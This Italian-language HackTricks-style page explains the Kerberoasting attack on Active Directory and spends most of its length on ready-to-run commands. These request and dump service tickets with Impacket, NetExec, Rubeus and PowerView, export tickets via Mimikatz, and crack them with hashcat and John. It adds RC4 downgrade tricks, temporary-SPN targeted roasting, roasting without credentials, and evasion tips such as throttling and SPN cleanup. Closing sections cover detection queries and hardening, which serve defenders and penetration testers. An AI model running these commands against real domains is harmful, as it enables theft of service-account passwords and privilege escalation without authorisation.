# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Il Kerberoasting si concentra sull'acquisizione di ticket TGS, nello specifico quelli relativi a servizi eseguiti con account utente in Active Directory (AD), escludendo gli account computer. La crittografia di questi ticket utilizza chiavi derivate dalle password degli utenti, consentendo il credential cracking offline. L'uso di un account utente come servizio è indicato da una proprietà ServicePrincipalName (SPN) non vuota.

Qualsiasi utente autenticato del dominio può richiedere ticket TGS, quindi non sono necessari privilegi speciali.<sup>[[4]](#references)[[5]](#references)</sup>

### Punti chiave

- Prende di mira i ticket TGS per i servizi eseguiti con account utente (ovvero account con SPN impostato; non account computer).
- I ticket sono crittografati con una chiave derivata dalla password dell'account di servizio e possono essere sottoposti a cracking offline.
- Non sono necessari privilegi elevati; qualsiasi account autenticato può richiedere ticket TGS.

> [!WARNING]
> La maggior parte dei tool pubblici preferisce richiedere ticket di servizio RC4-HMAC (etype 23), perché sono più veloci da sottoporre a cracking rispetto ad AES. Gli hash RC4 TGS iniziano con `$krb5tgs$23$*`, quelli AES128 con `$krb5tgs$17$*` e quelli AES256 con `$krb5tgs$18$*`. Tuttavia, molti ambienti stanno passando a una configurazione solo AES. Non presumere che sia rilevante solo RC4.
> Inoltre, evita il roasting “spray-and-pray”. Il kerberoast predefinito di Rubeus può interrogare e richiedere ticket per tutti gli SPN ed è rumoroso. Esegui prima l'enumerazione e prendi di mira i principal interessanti.

### Segreti degli account di servizio e costo della crittografia Kerberos

Molti servizi sono ancora eseguiti con account utente dotati di password gestite manualmente. Il KDC crittografa i ticket di servizio con chiavi derivate da tali password e consegna il ciphertext a qualsiasi principal autenticato, quindi il kerberoasting consente tentativi offline illimitati senza lockout o telemetria del DC. La modalità di crittografia determina il cracking budget:

| Mode | Key derivation | Encryption type | Approx. RTX 5090 throughput* | Notes |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Salt blocks rainbow tables but still allows fast cracking of short passwords. |
| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **billion** guesses/s | ~1000× faster than AES; attackers force RC4 whenever `msDS-SupportedEncryptionTypes` permits it. |

*Benchmark di Chick3nman come indicato in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).<sup>[[3]](#references)</sup>

Il confounder di RC4 randomizza solo il keystream; non aggiunge lavoro per ogni tentativo. A meno che gli account di servizio non utilizzino segreti casuali (gMSA/dMSA, account computer o stringhe gestite da un vault), la velocità di compromissione dipende esclusivamente dal cracking budget della GPU. L'imposizione di etype solo AES elimina il downgrade da un miliardo di tentativi al secondo, ma le password umane deboli possono comunque essere violate da PBKDF2.<sup>[[3]](#references)</sup>

### Attacco

#### Linux

Un esempio pratico end-to-end che utilizza NetExec per richiedere ticket attaccabili e Hashcat per sottoporli a cracking è disponibile nel riferimento [1].<sup>[[1]](#references)</sup>
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Strumenti multifunzione che includono controlli kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Enumerare gli utenti kerberoastable
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: Richiedere il TGS ed eseguire il dump dalla memoria
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Tecnica 2: Strumenti automatici
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Una richiesta TGS genera l'evento di sicurezza di Windows 4769 (è stato richiesto un ticket di servizio Kerberos).

### OPSEC e ambienti solo AES

- Richiedi RC4 appositamente per gli account senza AES:
- Rubeus: `/rc4opsec` usa tgtdeleg per enumerare gli account senza AES e richiede service ticket RC4.
- Rubeus: `/tgtdeleg` con kerberoast attiva anche richieste RC4 quando possibile.<sup>[[6]](#references)</sup>
- Esegui il Roast degli account solo AES invece di fallire silenziosamente:
- Rubeus: `/aes` enumera gli account con AES abilitato e richiede service ticket AES (etype 17/18).
- Se possiedi già un TGT (PTT o da un file .kirbi), puoi usare `/ticket:<blob|path>` con `/spn:<SPN>` o `/spns:<file>` e saltare LDAP.
- Targeting, throttling e meno rumore:
- Usa `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` e `/jitter:<1-100>`.
- Filtra le password probabilmente deboli usando `/pwdsetbefore:<MM-dd-yyyy>` (password meno recenti) oppure esegui il targeting delle OU privilegiate con `/ou:<DN>`.<sup>[[8]](#references)</sup>

Esempi (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistenza / Abuso

Se controlli o puoi modificare un account, puoi renderlo kerberoastable aggiungendo un SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Esegui il downgrade di un account per abilitare RC4 e semplificare il cracking (richiede privilegi di scrittura sull'oggetto target):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast via GenericWrite/GenericAll su un utente (SPN temporaneo)

Quando BloodHound mostra che hai il controllo su un oggetto utente (ad es., GenericWrite/GenericAll), puoi eseguire in modo affidabile un “targeted-roast” su quell’utente specifico anche se al momento non dispone di SPN:<sup>[[9]](#references)</sup>

- Aggiungi uno SPN temporaneo all’utente controllato per renderlo roastabile.
- Richiedi un TGS-REP cifrato con RC4 (etype 23) per quello SPN, così da favorire il cracking.
- Esegui il cracking dell’hash `$krb5tgs$23$...` con hashcat.
- Rimuovi lo SPN per ridurre il footprint.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner (targetedKerberoast.py automatizza l'aggiunta dello SPN -> la richiesta del TGS (etype 23) -> la rimozione dello SPN):<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Crack l'output con l'autodetect di hashcat (modalità 13100 per `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Note sulla detection: l'aggiunta/rimozione di SPN produce modifiche nella directory (Event ID 5136/4738 sull'utente target) e la richiesta TGS genera Event ID 4769. Considera il throttling e la pulizia del prompt.

Puoi trovare strumenti utili per gli attacchi kerberoast qui: https://github.com/nidem/kerberoast

Se riscontri questo errore da Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, è dovuto a una differenza nell'ora locale. Sincronizza con il DC:

- `ntpdate <DC_IP>` (deprecato in alcune distro)
- `rdate -n <DC_IP>`

### Kerberoast senza un account di dominio (AS-requested STs)

Nel settembre 2022, Charlie Clark ha mostrato che, se un principal non richiede la pre-autenticazione, è possibile ottenere un service ticket tramite un KRB_AS_REQ appositamente creato, modificando lo sname nel corpo della richiesta e ottenendo di fatto un service ticket invece di un TGT. Questo rispecchia l'AS-REP roasting e non richiede credenziali di dominio valide.

Vedi i dettagli nel write-up di Semperis “New Attack Paths: AS-requested STs”.<sup>[[10]](#references)</sup>

> [!WARNING]
> Devi fornire un elenco di utenti perché, senza credenziali valide, non puoi interrogare LDAP con questa tecnica.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Correlato

Se stai prendendo di mira utenti vulnerabili ad AS-REP roast, consulta anche:

{{#ref}}
asreproast.md
{{#endref}}

### Rilevamento

Kerberoasting può essere furtivo. Cerca l'Event ID 4769 dai DC e applica filtri per ridurre il rumore:

- Escludi il nome del servizio `krbtgt` e i nomi dei servizi che terminano con `$` (account computer).
- Escludi le richieste provenienti da account computer (`*$$@*`).
- Solo richieste riuscite (Failure Code `0x0`).
- Monitora i tipi di crittografia: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Non generare alert solo per `0x17`.

Esempio di analisi preliminare con PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Idee aggiuntive:

- Definire il normale utilizzo degli SPN per host/utente; generare un alert in caso di grandi raffiche di richieste SPN distinti da parte di un singolo principal.
- Segnalare l'uso insolito di RC4 in domini hardened con AES.

### Mitigation / Hardening

- Utilizzare gMSA/dMSA o account macchina per i servizi. Gli account gestiti hanno password casuali di oltre 120 caratteri e ruotano automaticamente, rendendo impraticabile il cracking offline.<sup>[[7]](#references)</sup>
- Applicare AES agli account di servizio impostando `msDS-SupportedEncryptionTypes` esclusivamente su AES (decimale 24 / esadecimale 0x18), quindi ruotare la password affinché vengano derivate le chiavi AES.<sup>[[7]](#references)</sup>
- Ove possibile, disabilitare RC4 nell'ambiente e monitorare i tentativi di utilizzo di RC4. Sui DC è possibile utilizzare il valore di registro `DefaultDomainSupportedEncTypes` per definire i valori predefiniti per gli account che non hanno impostato `msDS-SupportedEncryptionTypes`. Eseguire test approfonditi.
- Rimuovere gli SPN non necessari dagli account utente.<sup>[[7]](#references)</sup>
- Utilizzare password lunghe e casuali per gli account di servizio (25+ caratteri) se gli account gestiti non sono praticabili; vietare le password comuni ed eseguire audit regolari.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + cracking con hashcat nella pratica](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: attacchi low-tech ad alto impatto basati sulla crittografia Kerberos legacy (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Come attaccare Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Abuso di Active Directory Kerberos: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: richiesta di TGS cifrati con RC4 quando AES è abilitato](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Indicazioni di Microsoft per contribuire a mitigare il Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – documentazione del comando kerberoast di Rubeus](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — credenziali SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync per DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – Nuovi percorsi di attacco? AS Requested Service Tickets (Charlie Clark, settembre 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
